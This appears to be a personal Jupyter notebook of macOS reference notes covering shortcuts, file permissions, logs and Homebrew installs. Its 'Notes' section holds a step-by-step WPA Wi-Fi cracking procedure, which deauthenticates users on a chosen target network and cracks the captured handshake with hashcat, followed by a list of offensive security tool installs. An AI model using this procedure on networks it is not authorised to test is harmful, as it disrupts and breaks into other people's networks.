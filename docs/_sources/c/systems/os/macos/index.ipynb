{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# macOS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Table of Contents\n",
    "```{contents}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "App | UI | macOS | Windows\n",
    "----|----|-------|--------\n",
    "File Manager | GUI | [Finder](https://en.wikipedia.org/wiki/Finder_(software)) | [File Explorer](https://en.wikipedia.org/wiki/File_Explorer)\n",
    "Shell/CLI    | TUI | [Zsh](https://en.wikipedia.org/wiki/Z_shell), [Bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)), [PowerShell](https://en.wikipedia.org/wiki/PowerShell) | [PowerShell](https://en.wikipedia.org/wiki/PowerShell), [Git Bash](https://gitforwindows.org/), [Command Prompt](https://en.wikipedia.org/wiki/Cmd.exe)\n",
    "Terminal     | GUI | [Terminal.app](https://en.wikipedia.org/wiki/List_of_macOS_built-in_apps#Terminal) | [Windows Terminal](https://en.wikipedia.org/wiki/Windows_Terminal)\n",
    "Text Editor  | GUI | [TextEdit](https://en.wikipedia.org/wiki/TextEdit) | [Notepad](https://en.wikipedia.org/wiki/Windows_Notepad)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "/Users/<user>/anaconda3     # graphical install\n",
    "/Users/<user>/opt/anaconda3 # shell install\n",
    "MongoDB\n",
    "PostgreSQL\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Documentation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [d](https://support.apple.com/guide/terminal/welcome/mac) ] Terminal User Guide\n",
    "* [ [d](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html#//apple_ref/doc/uid/10000172i-SW1-SW1) ] About Daemons and Services\n",
    "  * [ [d](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/ScheduledJobs.html#//apple_ref/doc/uid/10000172i-CH1-SW2) ] Scheduling Timed Jobs\n",
    "* [ [d](https://support.apple.com/guide/terminal/automate-tasks-using-applescript-and-terminal-trml1003/mac) ] Automate tasks using AppleScript and Terminal on Mac\n",
    "* [ [d](https://support.apple.com/guide/terminal/change-profiles-shell-settings-trmlshll/2.14/mac/14.0) ] Change Profiles Shell settings in Terminal on Mac\n",
    "* [ [d](https://support.apple.com/guide/terminal/intro-to-shell-scripts-apd53500956-7c5b-496b-a362-2845f2aab4bc/2.14/mac) ] Intro to shell scripts in Terminal on Mac\n",
    "  * [ [d](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/Introduction/Introduction.html) ] Shell Scripting Primer\n",
    "* [ [d](https://support.apple.com/guide/terminal/keyboard-shortcuts-trmlshtcts/mac) ] Keyboard shortcuts in Terminal on Mac\n",
    "* [ [d](https://support.apple.com/guide/terminal/make-a-file-executable-apdd100908f-06b3-4e63-8a87-32e71241bab4/2.14/mac) ] Make a file executable in Terminal on Mac\n",
    "* [ [d](https://support.apple.com/guide/terminal/open-or-quit-terminal-apd5265185d-f365-44cb-8b09-71a064a42125/mac) ] Open or quit Terminal on Mac\n",
    "* [ [d](https://support.apple.com/guide/mac-help/schedule-your-mac-to-turn-on-or-off-mchl40376151/mac) ] Schedule your Mac to turn on or off in Terminal\n",
    "* [ [d](https://support.apple.com/guide/terminal/script-management-with-launchd-apdc6c1077b-5d5d-4d35-9c19-60f2397b2369/mac) ] Script management with launchd in Terminal on Mac\n",
    "* [ [d](https://support.apple.com/guide/terminal/default-startup-terminal-window-profiles-trml5856b1f2/mac) ] Specify default and startup Terminal window profiles on Mac\n",
    "* [ [d](https://support.apple.com/guide/terminal/use-command-line-text-editors-apdb02f1133-25af-4c65-8976-159609f99817/mac) ] Use command-line text editors in Terminal on Mac\n",
    "* [ [d](https://support.apple.com/guide/terminal/profiles-change-terminal-windows-trml107/mac) ] Use profiles to change the look of Terminal windows on Mac"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "User Guide\n",
    "* [ [d](https://support.apple.com/guide/mac-help/set-mac-shuts-a-ups-mchlp2987/mac) ] Set when your Mac shuts down while using a UPS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* [About wireless roaming for enterprise](https://support.apple.com/en-us/HT203068)\n",
    "* [Command Line Primer](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/CommandLInePrimer/CommandLine.html)\n",
    "* [Reading UNIX Manual Pages](https://developer.apple.com/documentation/os/reading_unix_manual_pages)\n",
    "* [Schedule your Mac to turn on or off in Terminal](https://support.apple.com/guide/mac-help/schedule-your-mac-to-turn-on-or-off-mchl40376151/13.0/mac/13.0)\n",
    "* [Use zsh as the default shell on your Mac](https://support.apple.com/en-us/HT208050)\n",
    "\n",
    "[Terminal User Guide](https://support.apple.com/guide/terminal/welcome/mac)\n",
    "* [Execute commands and run tools in Terminal on Mac](https://support.apple.com/guide/terminal/execute-commands-and-run-tools-apdb66b5242-0d18-49fc-9c47-a2498b7c91d5/mac)\n",
    "* [Keyboard shortcuts in Terminal on Mac](https://support.apple.com/guide/terminal/keyboard-shortcuts-trmlshtcts/2.13/mac/13.0)\n",
    "* [Redirect Terminal input and output on mac](https://support.apple.com/guide/terminal/redirect-terminal-input-and-output-apd1dbe647b-7e11-49dc-aa76-89aa7e53ce36/2.13/mac/13.0)\n",
    "* [Specify files and folders in Terminal on Mac](https://support.apple.com/guide/terminal/specify-files-and-folders-apd3cf6fe02-3ec8-48f1-951f-866e52955fc8/2.13/mac/13.0)\n",
    "\n",
    "[Set a custom umask in macOS](https://support.apple.com/en-us/HT201684)\n",
    "* `sudo launchctl config user umask nnn`\n",
    "* `sudo launchctl config system umask nnn`\n",
    "* `sudo mkdir -m 755 /private/var/db/com.apple.xpc.launchd/config` If Terminal responds \"Could not write configuration: No such file or directory\".\n",
    "* default umask value: 022; default file value: 666; default folder value: 777\n",
    "\n",
    "Homebrew Package Manager\n",
    "* [Home](https://brew.sh/)\n",
    "* brew\n",
    "  * `brew -h` How do I use command `brew`?\n",
    "  * `brew -v` What is the Homebrew version?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## File System"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The native graphical file explorer application on macOS is [Finder](https://en.wikipedia.org/wiki/Finder_(software)).\n",
    "\n",
    "The tilde `~` is an abbreviation for the user's home directory `/Users/USERNAME`.\n",
    "\n",
    "Some important user-level resources.\n",
    "\n",
    "```\n",
    "~\n",
    "├── .bashrc            # config file: Bash shell\n",
    "├── .condarc           # config file: Conda package manager\n",
    "├── .gitconfig         # config file: Git version control system\n",
    "├── .jupyter\n",
    "│   ├── jupyter_lab_config.py\n",
    "│   └── lab\n",
    "├── .ssh\n",
    "│   ├── id_ed25519     # SSH key pair: private key\n",
    "│   └── id_ed25519.pub # SSH key pair: public key\n",
    "├── .vimrc             # config file: Vim text editor\n",
    "├── .zshrc             # config file: Z shell\n",
    "│\n",
    "├── Applications       # standard user directories\n",
    "├── Desktop\n",
    "├── Documents\n",
    "└── Downloads\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "File System Permissions and ACLs\n",
    "\n",
    "* `chgrp` - change group\n",
    "* `chmod` - change file modes or Access Control Lists\n",
    "* `chown` - change file owner and group\n",
    "* `chpass`, `chfn`, `chsh` - add or change user database information\n",
    "* `dscl` -  Directory Service command line utility\n",
    "* `groups` - show group memberships\n",
    "* `id` - return user identity\n",
    "* `login` - log into the computer\n",
    "* `passwd` - modify a user's password\n",
    "* `su`\n",
    "* `sudo`\n",
    "* `umask`\n",
    "* `users`\n",
    "* `visudo`\n",
    "* `xattr`\n",
    "\n",
    "Permissions\n",
    "* chown\n",
    "* delete\n",
    "* readattr\n",
    "* readextattr\n",
    "* readsecurity\n",
    "* writeattr\n",
    "* writeextattr\n",
    "* writesecurity\n",
    "\n",
    "Directory Permissions\n",
    "* add_file\n",
    "* add_subdirectory\n",
    "* delete_child\n",
    "* list\n",
    "* search\n",
    "\n",
    "Non Directory Permissions\n",
    "* append\n",
    "* execute\n",
    "* read\n",
    "* write\n",
    "\n",
    "ACL Inheritance\n",
    "* directory_inherit\n",
    "* file_inherit\n",
    "* limit_inherit\n",
    "* only_inherit"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`/usr/libexec/ApplicationFirewall/socketfilterfw`\n",
    "* `/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate --getblockall --getallowsigned --getstealthmode`\n",
    "* `/usr/libexec/ApplicationFirewall/socketfilterfw --listapps`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Package Management\n",
    "\n",
    "* [ [w](https://en.wikipedia.org/wiki/Homebrew_(package_manager)) ] Homebrew\n",
    "* [ [w](https://en.wikipedia.org/wiki/Package_manager) ] Package Manager\n",
    "\n",
    "```bash\n",
    "brew --version\n",
    "brew upgrade && brew update && brew cleanup\n",
    "brew search ansible\n",
    "brew info ansible\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### GNU Utilities"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "brew install autoconf\n",
    "brew install bash\n",
    "brew install binutils\n",
    "brew install coreutils\n",
    "brew install diffutils\n",
    "brew install ed\n",
    "brew install findutils\n",
    "brew install flex\n",
    "brew install gawk\n",
    "brew install gnu-indent\n",
    "brew install gnu-sed\n",
    "brew install gnu-tar\n",
    "brew install gnu-which\n",
    "brew install gpatch\n",
    "brew install grep\n",
    "brew install gzip\n",
    "brew install less\n",
    "brew install m4\n",
    "brew install make\n",
    "brew install nano\n",
    "brew install screen\n",
    "brew install watch\n",
    "brew install wdiff\n",
    "brew install wget\n",
    "brew isntall zip\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Logs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```zsh\n",
    "/var/log                         # unix-ish system-wide event logs (apps stored in `/usr/local` or `/opt`)\n",
    "/var/log/system.log              # system log\n",
    "/var/log/DiagnosticMessages      # mac analytics\n",
    "/Library/Logs                    # mac-ish system-wide event logs\n",
    "/Library/Logs/Diagnosticreports  # system reports\n",
    "~/Library/Logs                   # user app logs\n",
    "~/Library/Logs/DiagnosticReports # user reports\n",
    "```\n",
    "\n",
    "```zsh\n",
    "man log\n",
    "man logger\n",
    "man syslog\n",
    "```\n",
    "\n",
    "resources\n",
    "* https://developer.apple.com/documentation/os/logging\n",
    "* https://boredzo.org/blog/archives/2008-01-19/next-week-apple-system-logger"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Cron"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Grant `/usr/sbin/cron` full disk access via Settings -> Privacy and Security -> Full Disk Access -> `+` -> `Cmd-Shift-G` -> `/usr/sbin/cron`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Magic Number"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```bash\n",
    "/usr/share/file/magic\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```c\n",
    "// helloworld.c\n",
    "#include <stdio.h>\n",
    "\n",
    "int main () {\n",
    "  printf(\"Hello World!\\n\");\n",
    "  return 0;\n",
    "}\n",
    "```\n",
    "```bash\n",
    "gcc helloworld.c -o helloworld\n",
    "xxd -s0 -l4 -e helloworld      # little-endian\n",
    "```\n",
    "```\n",
    "00000000: feedfacf                              ....\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Keyboard Shortcuts"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [d](https://support.apple.com/en-us/HT201236) ] Mac keyboard shortcuts"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`Ctrl + Shift + -` split cell<br>\n",
    "`Option + Right` go right one word<br>\n",
    "`Option + Left` go left one word<br>\n",
    "`Command + Up` go to cell start<br>\n",
    "`Command + Down` go to cell end<br>\n",
    "`Command + z` undo<br>\n",
    "`Command + Shift + z` redo<br>\n",
    "`Command + ]` indend<br>\n",
    "`Command + [` dedent<br>\n",
    "`Command + a` select all<br>\n",
    "`Option + delete` delete preceding word<br>\n",
    "`Command + delete` delete preceding line<br>\n",
    "\n",
    "Shortcut | Graphical | Action\n",
    "-|-|-\n",
    "Cmd-Right | &#8984;&rarr; | Jump to the last/rightmost column\n",
    "Cmd-Left  | &#8984;&larr; | Jump to the first/leftmost column\n",
    "Cmd-Up    | &#8984;&uarr; | Jump to the first/topmost row\n",
    "Cmd-Down  | &#8984;&darr; | Jump to the last/bottommost row\n",
    "Cmd-z     | &#8984;z      | Undo\n",
    "Cmd-s     | &#8984;s      | Save\n",
    "Cmd-c     | &#8984;c      | Copy\n",
    "Cmd-v     | &#8984;v      | Paste\n",
    "Cmd-f     | &#8984;f      | Search\n",
    "Cmd-a     | &#8984;a      | Select All\n",
    "\n",
    "Cursor\n",
    "\n",
    "Shortcut | Graphical | Action\n",
    "---------|-----------|-------\n",
    "Cmd-Up    | &#8984;&uarr; | Move the insertion point to the beginning of the document\n",
    "Cmd-Down  | &#8984;&darr; | Move the insertion point to the end of the document\n",
    "Cmd-Left  | &#8984;&larr; | Move the insertion point to the beginning of the line\n",
    "Cmd-Right | &#8984;&rarr; | Move the insertion point to the end of the line\n",
    "Opt-Left  | &#8997;&larr; | Move the insertion point to the beginning of the previous word\n",
    "Opt-Right | &#8997;&rarr; | Move the insertion point to the end of the next word\n",
    "Ctrl-A    | &#8963;A | Move to the beginning of the line\n",
    "Ctrl-E    | &#8963;E | Move to the end of the line\n",
    "Ctrl-F    | &#8963;F | Move one character forward\n",
    "Ctrl-B    | &#8963;B | Move one character backward\n",
    "Ctrl-L    | &#8963;L | Center the cursor\n",
    "Ctrl-P    | &#8963;P | Move up one line\n",
    "Ctrl-N    | &#8963;N | Move down one line\n",
    "\n",
    "* Ctrl-A Move the cursor to the beginning of the line\n",
    "* Ctrl-E Move the cursor to the end of the line\n",
    "* Ctrl-K delete everything after the cursor\n",
    "* Ctrl-U delete entire line\n",
    "* Ctrl-D delete character\n",
    "* Ctrl-W delete word\n",
    "* Ctrl-Y get last command\n",
    "* Ctrl-_ undo\n",
    "\n",
    "Copy-Paste\n",
    "\n",
    "Shortcut | Graphical | Action\n",
    "---------|-----------|-------\n",
    "Cmd-X       | &#8984;X | Cut & Copy\n",
    "Cmd-C       | &#8984;C | Copy\n",
    "Cmd-V       | &#8984;V | Paste\n",
    "Cmd-Z       | &#8984;Z | Undo\n",
    "Shift-Cmd-Z | &#8679;&#8984;Z | Redo\n",
    "\n",
    "Deletion\n",
    "\n",
    "Shortcut | Action\n",
    "---------|-------\n",
    "Opt-Del | Delete the word to the left of the insertion point\n",
    "Del, Ctrl-H | Delete the character to the left of the insertion point\n",
    "Ctrl-D | Delete the character to the right of the insertion point\n",
    "Ctrl-K | Delete the text between the insertion point and the end of the line or paragraph\n",
    "\n",
    "Selection\n",
    "\n",
    "Shortcut | Action | Description\n",
    "---------|--------|------------\n",
    "Cmd-A | Select all |\n",
    "Shift-Cmd-Up | Current to top | Select the text between the insertion point and the beginning of the document\n",
    "Shift-Cmd-Down | Current to bottom | Select the text between the insertion point and the end of the document\n",
    "Shift-Cmd-Left | Current to line start | Select the text between the insertion point and the beginning of the current line\n",
    "Shift-Cmd-Right | Current to line end | Select the text between the insertion point and the end of the current line\n",
    "Shift-Up | Current to line up | Extend text selection to the nearest character at the same horizontal location on the line above\n",
    "Shift-Down | Current to line down | Extend text selection to the nearest character at the same horizontal location on the line below\n",
    "Shift-Left | Current to previous character | Extend text Selection one character to the left\n",
    "Shift-Right | Current to next character | Extend text selection one character to the right\n",
    "Opt-Shift-Up | | Extend text selection to the beginning of the current paragraph, then to the beginning of the following paragraph if pressed again\n",
    "Opt-Shift-Down | | Extend text selection to the end of the current paragraph, then to the end of the following paragraph if pressed again\n",
    "Opt-Shift-Left | | Extend text selection to the beginning of the current word, then to the beginning of the following word if pressed again\n",
    "Opt-Shift-Right | | Extend text selection to the end of the current word, then to the end of the following word if pressed again\n",
    "\n",
    "Other\n",
    "\n",
    "Shortcut | Action\n",
    "---------|-------\n",
    "Ctrl-O | Insert a new line after the insertion point\n",
    "Ctrl-T | Swap the character behind the insertion point with the character in front of the insertion point\n",
    "Cmd-{  | Left align\n",
    "Cmd-}  | Right align\n",
    "Shift-Cmd-\\| | Center align\n",
    "\n",
    "Shortcut | Action\n",
    "---------|-------\n",
    "Find | Cmd-F\n",
    "Find Again, next occurrence | Cmd-G\n",
    "Find Again, previous occurrence | Shift-Cmd-G\n",
    "Hide the windows of the front app | Cmd-H\n",
    "Hide the windows of all other apps other than the front app | Opt-Cmd-H\n",
    "Minimize the front window | Cmd-M\n",
    "Open the selected item or select a file to open | Cmd-O\n",
    "Print | Cmd-P\n",
    "Save | Cmd-S\n",
    "New tab | Cmd-T\n",
    "Close the front window | Cmd-W\n",
    "Close all the windows of the front app | Opt-Cmd-W\n",
    "Minimize all windows of the front app | Opt-Cmd-W\n",
    "Force quit an app | Opt-Cmd-Esc\n",
    "Show-hide the search utility | Cmd-Space\n",
    "Show Character Viewer | Ctrl-Cmd-Space\n",
    "Full screen app | Ctrl-Cmd-F\n",
    "Switch to the most recently used app among open apps | Cmd-Tab, Shift-Cmd-Tab\n",
    "Take a screenshot or screen recording | Shift-Cmd-5\n",
    "Take a screenshot | Shift-Cmd-4\n",
    "Take a screenshot immediately | Shift-Cmd-3\n",
    "Create new | Cmd-N\n",
    "Create new folder | Shift-Cmd-N\n",
    "Open preferences for the front app | Cmd-Comma"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## iTerm2 Shortcuts"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [d](https://support.apple.com/guide/terminal/keyboard-shortcuts-trmlshtcts/mac) ] Keyboard shortcuts in Terminal on Mac"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Textual | Graphical | Action\n",
    "--------|-----------|-------\n",
    "`Opt-`LeftClick   | &#8997;+LeftClick      | move the cursor to a different character in the command line\n",
    "`Cmd-D`           |        &#8984;D        | split window vertically with current profile\n",
    "`Shift-Cmd-D`     | &#8679;&#8984;D        | split window horizontally with current profile\n",
    "`Opt-Shift-Cmd-V` | &#8997;&#8679;&#8984;V | split window vertically\n",
    "`Opt-Shift-Cmd-H` | &#8997;&#8679;&#8984;H | split window horizontally"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tips and Tricks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Dragging a file into the terminal automatically types the path of the file."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Resources"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://apple.stackexchange.com/questions/395453/how-to-prevent-macbook-pro-from-powering-up-by-pressing-any-key"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [g](https://github.com/donnemartin/dev-setup) ] donnemartin's macOS development environment setup\n",
    "\n",
    "* https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/Introduction/Introduction.html\n",
    "* https://gpanders.com/blog/exploring-mach-o-part-1/\n",
    "\n",
    "https://osxdaily.com/2013/08/15/turn-the-terminal-into-a-matrix-style-scrolling-screen-of-binary-or-gibberish/\n",
    "\n",
    "https://osxdaily.com/2013/12/06/snow-terminal-mac-os-x-command/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [h](https://macmenubar.com/) ] menu bar\n",
    "* https://www.reddit.com/r/macapps/comments/13gfmf8/what_apps_do_you_have_in_your_menubar/\n",
    "* [ [h](https://www.macbartender.com/) ] Bartender\n",
    "* [ [h](https://folivora.ai/) ] BetterTouchTool\n",
    "* [ [h](https://frankbyte.com/weather) ] Big Weather\n",
    "* [ [h](https://cleanshot.com/) ] CleanShot\n",
    "* [ [h](https://colorslurp.com/) ] ColorSlurp\n",
    "* [ [h](https://kapeli.com/dash) ] Dash\n",
    "* [ [h](https://sindresorhus.com/dato) ] Dato\n",
    "* [ [h](https://software.charliemonroe.net/downie/) ] Downie\n",
    "* [ [h](https://dropoverapp.com/) ] Dropover\n",
    "* [ [h](https://flexibits.com/fantastical) ] Fantastical\n",
    "* [ [h](https://maddin.io/gestimer/) ] Gestimer\n",
    "* [ [h](https://bjango.com/mac/istatmenus/) ] iStat\n",
    "* [ [h](https://intellibar.app/) ] IntelliBar\n",
    "* [ [h](https://www.mowglii.com/itsycal/) ] Itsycal\n",
    "* [ [h](https://lookupper.com/) ] Lookupper\n",
    "* [ [h](https://lunar.fyi/) ] Lunar\n",
    "* [ [h](https://sindresorhus.com/lungo) ] Lungo\n",
    "* [ [g](https://github.com/MonitorControl/MonitorControl) ] MonitorControl\n",
    "* [ [h](https://numi.app/) ] Numi\n",
    "* [ [h](https://nzbcontrol.info/) ] NZB Control\n",
    "* [ [h](https://fireball.studio/oneswitch) ] OneSwitch\n",
    "* [ [h](https://parcelapp.net/) ] Parcel\n",
    "* [ [h](https://getpixelsnap.com/) ] PixelSnap\n",
    "* [ [h](https://www.popclip.app/) ] PopClip\n",
    "* [ [h](https://www.raycast.com/) ] Raycast\n",
    "* [ [h](https://rectangleapp.com/) ] Rectangle\n",
    "* [ [g](https://github.com/nehayward/Scenecuts) ] Scenecuts\n",
    "* [ [h](https://wegenerlabs.com/) ] Scrap Paper\n",
    "* [ [g](https://github.com/exelban/stats) ] Stats\n",
    "* [ [h](https://superkey.app/) ] Superkey\n",
    "* [ [h](https://highlyopinionated.co/swish/) ] Swish\n",
    "* [ [h](https://tot.rocks/) ] Tot\n",
    "* [ [h](https://eternalstorms.at/yoink/mac/) ] Yoink"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### YouTube"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Linus Tech Tips\n",
    "* [ [y](https://www.youtube.com/watch?v=ji5kZ3VdFDY) ] `11-27-2023`. \"Apple please watch this. - Frore AirJet MacBook Air\".\n",
    "\n",
    "NetworkChuck\n",
    "* [ [y](https://www.youtube.com/watch?v=qOrlYzqXPa8) ] `11-21-2022`. \"50 macOS Tips and Tricks Using Terminal (the last one is CRAZY!)\".\n",
    "\n",
    "Shannon Morse\n",
    "* [ [y](https://www.youtube.com/watch?v=Po4w3bsLFdc) ] `01-31-2024`. \"Will Apple’s RCS Include End to End Encryption?\"."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* [ [y](https://www.youtube.com/watch?v=TXzrk3b9sKM) ] `07-27-2015`. Corey Schafer. \"Mac OS X Terminal Tutorial: Time-Saving Keyboard Shortcuts\"."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Terms"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* [ [w](https://en.wikipedia.org/wiki/Berkeley_Software_Distribution) ] BSD Berkeley Software Distribution\n",
    "* [ [w](https://en.wikipedia.org/wiki/Darwin_(operating_system)) ] Darwin\n",
    "* [ [w](https://en.wikipedia.org/wiki/Graphical_user_interface) ] Graphical User Interface (GUI)\n",
    "* [ [w](https://en.wikipedia.org/wiki/Homebrew_(package_manager)) ] Homebrew\n",
    "* [ [w](https://en.wikipedia.org/wiki/Mach_(kernel)) ] Mach\n",
    "* [ [w](https://en.wikipedia.org/wiki/Mach-O) ] Mach-O\n",
    "* [ [w](https://en.wikipedia.org/wiki/MacOS) ] macOS\n",
    "* [ [w](https://en.wikipedia.org/wiki/NeXTSTEP) ] NeXTSTEP\n",
    "* [ [w](https://en.wikipedia.org/wiki/Operating_system) ] Operating System (OS)\n",
    "* [ [w](https://en.wikipedia.org/wiki/Computing_platform) ] Platform\n",
    "* [ [w](https://en.wikipedia.org/wiki/Platform_ecosystem) ] Platform Ecosystem\n",
    "* [ [w](https://en.wikipedia.org/wiki/POSIX) ] POSIX\n",
    "* [ [w](https://en.wikipedia.org/wiki/PowerShell) ] PowerShell\n",
    "* [ [w](https://en.wikipedia.org/wiki/Preferred_Executable_Format) ] Preferred Executable Format (PEF)\n",
    "* [ [w](https://en.wikipedia.org/wiki/Text-based_user_interface) ] Text/Terminal User Interface (TUI)\n",
    "* [ [w](https://en.wikipedia.org/wiki/Unix) ] Unix\n",
    "* [ [w](https://en.wikipedia.org/wiki/XNU) ] XNU"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notes"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://medium.com/small-tech-talk/macos-crack-wifi-passwords-134559960edd\n",
    "\n",
    "```bash\n",
    "# link airport to make it easily accessible\n",
    "sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport\n",
    "\n",
    "# sources, binaries, captures, dictionaries\n",
    "mkdir -p hck/{src,bin,cap,dict}\n",
    "\n",
    "#-----[ zizzania ]\n",
    "cd hck/src\n",
    "git clone git@github.com:cyrus-and/zizzania.git\n",
    "cd zizzania\n",
    "make -f config.Makefile\n",
    "make\n",
    "ln -s $(pwd)/src/zizzania ../../bin/zizzania\n",
    "cd ../.. # back to root\n",
    "\n",
    "#-----[ hashcat-utils ]\n",
    "cd src\n",
    "git clone git@github.com:hashcat/hashcat-utils.git\n",
    "cd hashcat-utils/src\n",
    "make\n",
    "ln -s $(pwd)/cap2hccapx.bin ../../../bin/cap2hccapx\n",
    "cd ../../.. # back to root\n",
    "\n",
    "cd dict\n",
    "wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2\n",
    "bunzip rockyou.txt.bz2\n",
    "cd .. # back to root\n",
    "\n",
    "airport -s                       # scan available networks and choose a target\n",
    "sudo airport --disassociate      # dissociate the network\n",
    "sudo airport --channel=<channel> # set the channel to match the target network\n",
    "\n",
    "sudo ./bin/zizzania -i en0 -b <BSSID> -w cap/capture.pcap -v # warning: this command deauthenticates users on the target network\n",
    "./bin/cap2hccapx cap/capture.pcap cap/capture.hccapx         # convert capture to hccapx\n",
    "\n",
    "hashcat -m 2500 cap/capture.hccapx dict/rockyou.txt\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* [ [d](https://pipx.pypa.io/stable/) ][ [g](https://github.com/pypa/pipx) ] pipx [ [pipx vs](https://pipx.pypa.io/stable/comparisons/) ]\n",
    "\n",
    "```bash\n",
    "brew install pipx\n",
    "```\n",
    "\n",
    "```bash\n",
    "scoop install pipx\n",
    "```\n",
    "https://medium.com/@seitzmanuel/how-to-get-your-mac-osx-ready-for-playing-ctfs-hacking-6b6801250d1e\n",
    "\n",
    "```bash\n",
    "brew install burp-suite\n",
    "brew install owasp-zap\n",
    "brew install ghidra\n",
    "brew install wireshark\n",
    "brew install nmap\n",
    "brew install gobuster\n",
    "brew install nikto\n",
    "brew install wpscanteam/tap/wpscan\n",
    "brew install metasploit\n",
    "brew install exploitdb\n",
    "brew install hashcat\n",
    "brew install sambdabrew install binwalk\n",
    "brew install exiftool\n",
    "brew install aircrack-ng\n",
    "brew install hydra\n",
    "brew install sqlmap\n",
    "\n",
    "git clone https://github.com/ShawnDEvans/smbmap.git\n",
    "python -m pip install -r requirements.txt\n",
    "ln -s smbmap/smbmap.py /usr/local/bin/smbmap\n",
    "\n",
    "git clone https://github.com/CiscoCXSecurity/enum4linux.git\n",
    "ln -s enum4linux/enum4linux.pl /usr/local/bin/enum4linux\n",
    "\n",
    "pipx install crackmapexec\n",
    "pipx install git+https://github.com/calebstewart/pwncat.git\n",
    "\n",
    "git clone https://github.com/3ndG4me/KaliLists.git wordlists\n",
    "gzip -d wordlists/rockyou.txt.gz\n",
    "\n",
